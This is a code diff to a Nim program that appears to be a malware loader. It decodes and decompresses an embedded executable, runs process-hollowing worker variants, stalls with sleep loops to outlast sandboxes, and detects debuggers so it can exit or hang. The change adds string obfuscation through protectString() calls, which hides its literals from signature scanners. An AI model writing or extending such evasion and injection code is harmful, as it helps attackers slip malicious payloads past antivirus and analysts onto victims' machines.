@@ -6,6 +6,7 @@ import antidebug
 import os
 import winim
 import strutils
+import nimprotect
 import supersnappy
 from std/base64 import decode
 
@@ -26,7 +27,7 @@ void raiseVEH() {
     int x = 4 / 0;
 }
 """.}
-proc raiseVEH(): void {.importc: "raiseVEH", nodecl.}
+proc raiseVEH(): void {.importc: protectString("raiseVEH"), nodecl.}
 
 proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0): bool =
     # Decode and decompress PE
@@ -37,22 +38,22 @@ proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), 
     when defined(hollow4) or defined(hollow5) or defined(hollow6):
         let commandLineParams = commandLineParams()
         for i in commandLineParams:
-            if i.startsWith("-A:") or i.startsWith("-W:") or i.startsWith("-T:") or i.startsWith("-R:"):
+            if i.startsWith(protectString("-A:")) or i.startsWith(protectString("-W:")) or i.startsWith(protectString("-T:")) or i.startsWith(protectString("-R:")):
                 # This is a worker process in splitted hollow, let it go
                 when defined(hollow4):
                     return hollow4Worker(peStr)
                 when defined(hollow5) or defined(hollow6):
                     return hollow56Worker(peStr)
-        if not ("-M" in commandLineParams):
+        if not (protectString("-M") in commandLineParams):
             quit(1)
 
     # Sleep at execution
     sleepUselessCalculations(sleepSeconds)
 
-    if antiDebugAction in["die", "troll"] and isDebugged():
-        if antiDebugAction == "die":
+    if antiDebugAction in[protectString("die"), protectString("troll")] and isDebugged():
+        if antiDebugAction == protectString("die"):
             quit(1)
-        elif antiDebugAction == "troll":
+        elif antiDebugAction == protectString("troll"):
             sleepUselessCalculations(999999999)
 
     # Enable debug privilege
